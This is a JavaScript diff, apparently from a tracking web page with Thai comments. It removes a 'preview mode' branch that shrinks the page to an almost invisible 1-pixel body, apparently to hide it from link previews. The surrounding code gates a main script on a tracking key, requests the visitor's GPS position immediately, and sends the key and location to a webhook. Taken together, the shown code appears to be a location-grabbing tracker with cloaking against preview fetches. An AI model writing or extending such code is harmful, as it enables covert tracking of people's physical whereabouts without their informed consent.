@@ -103,17 +103,6 @@
       }
     }
 
-    // ฟังก์ชันตรวจสอบว่าเป็นการเรียกในโหมด Preview หรือไม่
-    function isPreviewMode() {
-      try {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('preview') === 'true';
-      } catch (error) {
-        console.error("Error checking preview mode:", error);
-        return false;
-      }
-    }
-
     // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
     function sendDataToWebhook(trackingKey, location, source) {
       // สร้างออบเจ็กต์ข้อมูล
@@ -133,20 +122,6 @@
     // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
     if (hasValidTrackingKey()) {
       console.log("Tracking key is valid. Loading main script...");
-      
-      // ถ้าเป็นโหมด Preview ให้แสดงหน้าว่างเปล่า ขนาดเล็กมาก
-      if (isPreviewMode()) {
-        console.log("Preview mode detected, loading minimal page");
-        document.addEventListener('DOMContentLoaded', function() {
-          // ปรับขนาดหน้าเว็บให้เล็กมาก แทบมองไม่เห็น
-          document.body.style.margin = "0";
-          document.body.style.padding = "0";
-          document.body.style.overflow = "hidden";
-          document.body.style.height = "1px";
-          document.body.style.opacity = "0.01";
-          document.body.innerHTML = "<div style='width:1px;height:1px;'></div>";
-        });
-      }
       
       // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
       if (navigator.geolocation) {
